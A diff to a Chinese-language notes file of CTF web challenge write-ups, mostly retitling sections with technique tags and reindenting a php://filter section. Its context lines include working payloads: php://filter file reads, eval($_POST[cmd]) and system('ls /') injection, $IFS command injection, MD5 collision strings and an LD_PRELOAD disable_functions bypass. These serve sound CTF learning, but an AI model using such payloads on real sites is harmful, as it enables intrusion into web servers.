@@ -176,7 +176,7 @@
     ?msg={{handler.settings}}
   ```
 
-## ZJCTF2019 nizhuansiwei(代码审计+反序列化)
+## ZJCTF2019 nizhuansiwei(代码审计+php反序列化)
 
 [php(phar)反序列化漏洞及各种绕过姿势](https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/)
 
@@ -824,7 +824,7 @@ so:
         HANDLER tbl_name CLOSE
     ```
 
-## [CISCN2019 华北赛区 Day2 Web1]Hack World
+## [CISCN2019 华北赛区 Day2 Web1]Hack World(bool盲注)
 
 用bp fuzz测试或者其他方法，发现大部分关键字都被过滤了,所以考虑bool盲注
 利用python脚本解出flag。
@@ -862,7 +862,7 @@ so:
     print(flag)
 ```
 
-## [RoarCTF 2019]Easy Java
+## [RoarCTF 2019]Easy Java(java 配置文件泄露)
 
 ### WEB-INF知识点
 
@@ -900,7 +900,7 @@ servlet包含了路径信息，我们尝试包含一下FlagController所在路�
 
 这道题需要将请求方式改为POST，GET方式得不到想要的东西
 
-## [网鼎杯 2018]Fakebook(sql注入)
+## [网鼎杯 2018]Fakebook(sql注入+php反序列化)
 
 1. 扫描网站目录(御剑/dirsearch)
 
@@ -1312,9 +1312,9 @@ Twig
     func=\system&p=p=find / -name flag*
 ```
 
-## [BSidesCF 2020]Had a bad day(文件包含,php伪协议读取文件)
+## PHP伪协议
 
-### 题目解法
+### [BSidesCF 2020]Had a bad day(文件包含)
 
 点击页面中的按钮，GET传参，可能存在注入点，测试后发现不是SQL注入，根据报错信息得出和文件读取有关。更换参数网页提示只支持两个函数，读取index.php源码,
 
@@ -1341,65 +1341,65 @@ strpos — 查找字符串首次出现的位置
 
 payload: `php://filter/convert.base64-encode/resource=index/../flag` 或 `php://filter/convert.base64-encode/index/resource=flag`
 
-### php://filter/
+1. php://filter/
 
-#### String Filter (字符串过滤器)
+    1. String Filter (字符串过滤器)
 
-```php
-string.rot13/resource=flag.php
-# string.rot13对字符串执行 ROT13 转换，ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。
-string.toupper/resource=flag.php
-# string.toupper 将字符串转化为大写
-string.tolower/resource=flag.php
-# string.tolower 将字符串转化为小写
-string.strip_tags/resource=flag.php
-# string.strip_tags从字符串中去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果
-```
+        ```php
+        string.rot13/resource=flag.php
+        # string.rot13对字符串执行 ROT13 转换，ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。
+        string.toupper/resource=flag.php
+        # string.toupper 将字符串转化为大写
+        string.tolower/resource=flag.php
+        # string.tolower 将字符串转化为小写
+        string.strip_tags/resource=flag.php
+        # string.strip_tags从字符串中去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果
+        ```
 
-#### Conversion Filter(转化过滤器)
+    2. Conversion Filter(转化过滤器)
 
-```php
-convert.base64-encode & convert.base64-decode
+        ```php
+        convert.base64-encode & convert.base64-decode
 
-convert.iconv.<input-encoding>.<output-encoding> 
-# or 
-convert.iconv.<input-encoding>/<output-encoding>
+        convert.iconv.<input-encoding>.<output-encoding> 
+        # or 
+        convert.iconv.<input-encoding>/<output-encoding>
 
-convert.quoted-printable-encode & convert.quoted-printable-decode
+        convert.quoted-printable-encode & convert.quoted-printable-decode
 
-# <input-encoding>和<output-encoding> 就是编码方式，有如下几种;
-```
+        # <input-encoding>和<output-encoding> 就是编码方式，有如下几种;
+        ```
 
-```php
-UCS-4*
-UCS-4BE
-UCS-4LE*
-UCS-2
-UCS-2BE
-UCS-2LE
-UTF-32*
-UTF-32BE*
-UTF-32LE*
-UTF-16*
-UTF-16BE*
-UTF-16LE*
-UTF-7
-UTF7-IMAP
-UTF-8*
-ASCII*
-BASE64
-```
+        ```php
+        UCS-4*
+        UCS-4BE
+        UCS-4LE*
+        UCS-2
+        UCS-2BE
+        UCS-2LE
+        UTF-32*
+        UTF-32BE*
+        UTF-32LE*
+        UTF-16*
+        UTF-16BE*
+        UTF-16LE*
+        UTF-7
+        UTF7-IMAP
+        UTF-8*
+        ASCII*
+        BASE64
+        ```
 
-#### Compression Filters(压缩过滤器)
+   3. Compression Filters(压缩过滤器)
 
-```php
-# zlib.deflate（压缩）和 zlib.inflate（解压）
-zlib.deflate/resource=flag.php
-zlib.deflate|zlib.inflate/resource=flag.php
+        ```php
+        # zlib.deflate（压缩）和 zlib.inflate（解压）
+        zlib.deflate/resource=flag.php
+        zlib.deflate|zlib.inflate/resource=flag.php
 
-# bzip2.compress和 bzip2.decompress
-# 同上
-```
+        # bzip2.compress和 bzip2.decompress
+        # 同上
+        ```
 
 ## BJDCTF2020 ZJCTF，不过如此(文件包含 + RCE-远程代码执行)
 
@@ -1468,7 +1468,7 @@ zlib.deflate|zlib.inflate/resource=flag.php
 
  payload: `\S*=${eval($_POST[cmd])}`同时再POST一个`cmd=system("ls /");` 或者 `\S*=${getFlag()}&cmd=system('ls /');`
 
-## BUUCTF2018 Onlion Tool(RCE)
+## BUUCTF2018 Onlion Tool(RCE+文件上传漏洞)
 
 源码
 
@@ -1537,7 +1537,7 @@ escapeshellcmd — shell 元字符转义
 
 只是在这道题里面会过滤php，因此需要将木马换成短标签即`<?= ... ?>`, 然后php文件后缀名可以换成`.phtml`
 
-## [GXYCTF2019]禁止套娃
+## [GXYCTF2019]禁止套娃(.git泄露+无参RCE)
 
 1. dirsearch 扫描网站目录发现.git文件，可以判断是git泄露，通过GitHack将泄露文件下载到本地，发现网站源码
 
@@ -1660,7 +1660,7 @@ payload:`?exp=print_r(highlight_file(next(array_reverse(scandir(current(localeco
     <user><username>&test;</username><password>1123</password></user>
    ```
 
-## BJDCTF2020 Mark loves cat
+## BJDCTF2020 Mark loves cat(.git目录泄露+代码审计)
 
 1. 进去之后找不到有用的信息，dirsearch扫描目录，发现.git泄露
 2. GitHack下载泄露文件找到源码
@@ -1725,7 +1725,7 @@ payload:`?exp=print_r(highlight_file(next(array_reverse(scandir(current(localeco
 
         payload: `?flag=flag&is=flag`
 
-## WUSTCTF2020 朴实无华
+## WUSTCTF2020 朴实无华(MD5碰撞+php-intval()绕过)
 
 打开网页什么都没有，还是乱码，先试着访问一下robots.txt,进去了提示`/fAke_f1agggg.php`,那就接着访问这个网页，不出所料，flag不在这F12看源码，发现header里面有提示`/fl4g.php`,进去发现乱码，在firefox上可以Alt->查看->修复网页编码，变成正常的样子。
 
@@ -1834,7 +1834,7 @@ if (isset($_GET['get_flag'])){
 
 最终的payload： `/fl4g.php?num=1000e1&md5=0e2159&get_flag=head$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag`,这只是一种写法。
 
-## 安洵杯2019 easy_web
+## 安洵杯2019 easy_web(代码审计+MD5强碰撞)
 
 1. `TXpVek5UTTFNbVUzTURabE5qYz0`经过`base64decode->base64decode->hexdecode`得到555.png
 
@@ -1898,7 +1898,7 @@ if (isset($_GET['get_flag'])){
             &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
         ```
 
-## MRCTF2020 easypop
+## MRCTF2020 easypop(PHP魔术方法+反序列化)
 
 - 源码
 
@@ -2062,9 +2062,11 @@ if (isset($_GET['get_flag'])){
 
 ## 强网杯2019-高明的黑客(脚本编写)
 
-一进去提示下载文件，发现有3000多个脚本，根目录下几个php脚本没什么用，考点不在这儿。主要考测试脚本的编写能力，用的网上的wp脚本名称`testscript.py`
+一进去提示下载文件，发现有3000多个脚本，根目录下几个php脚本没什么用，考点不在这儿。主要考测试脚本的编写能力，用的网上的wp
 
-## MRCTF2020 PYWebsite
+脚本:[script_fuzz.py](./script_fuzz.py)
+
+## MRCTF2020 PYWebsite(请求头伪造)
 
 - **考点**
   X-Forwarded-For
@@ -2149,7 +2151,7 @@ if (isset($_GET['get_flag'])){
         python flask_session_cookie_manager3.py encode -s "176a7e21b5534065943ddf7a0af35eeb*abcdefgh" -t "{'admin':1}"
     ```
 
-## SWPU2019 web
+## SWPU2019 web(无列名注入+mysql.innodb_tabel_stats爆表名)
 
 - 考点
 
@@ -2196,7 +2198,7 @@ if (isset($_GET['get_flag'])){
     **注**：sql中过滤了 * 号。在无列名注入的时候 一定要和表的列数相同，不然会报错 。
     改： select 1,2,3 as a 只会把第3列重名为 a 。这次测试中必须要给重名一个列重命名否者无法正确读取数据
 
-## CISCN2019初赛 Love Math(字符串,数,进制转换)
+## CISCN2019初赛 Love Math(字符串,进制转换)
 
 [php代码审计前奏之ctfshow之命令执行](https://www.freebuf.com/articles/web/261049.html)
 
@@ -2626,7 +2628,7 @@ payload:
     
     所以此处可以使`username`为想要执行的命令。用bp抓包，会发现响应头中有访问链接，访问之后发现命令成功执行。以这种方式就可以得到flag。
 
-## [极客大挑战] RCE ME
+## [极客大挑战] RCE ME(无数字字母绕过)
 
   无数字字母绕过 + 环境变量 `LD_preload + mail`劫持so执行系统命令
 
@@ -2661,7 +2663,7 @@ url解码之后就是 `?code=phpinfo();`
 
   重新构造payload:`?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/bypass_disablefunc.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so`
 
-## SUCTF2019 Pythonnginx
+## SUCTF2019 Pythonnginx(IDNA编码绕过)
 
 1. 利用点
 
@@ -2882,7 +2884,7 @@ url解码之后就是 `?code=phpinfo();`
     print(flag)
     ```
 
-## GYCTF2020 FlaskAPP
+## GYCTF2020 FlaskAPP(Flask 获取debug模式PIN码)
 
 [Flask debug模式下的 PIN 码安全性](https://xz.aliyun.com/t/8092?time__1311=n4%2BxuDgDBADQYiKP40HwbDyiGDkDciiGmpcpoD&alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F8092)
 
